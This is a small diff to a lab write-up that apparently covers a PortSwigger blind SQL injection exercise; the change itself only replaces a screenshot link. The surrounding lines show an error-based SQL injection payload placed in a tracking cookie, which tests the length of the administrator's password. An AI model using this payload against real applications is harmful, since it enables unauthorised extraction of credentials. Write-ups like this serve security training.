@@ -91,7 +91,8 @@ We receive no error. means the condition is *False* and username administrator i
 SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>25) ||'
 ```
 
-![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4aa7af67-91b8-4755-84ed-546c04db96a5)
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/503f1698-b7c9-417d-967c-0da900c2d30c)
+
 
 ```no error which which means the length of the password is less than 25```
 
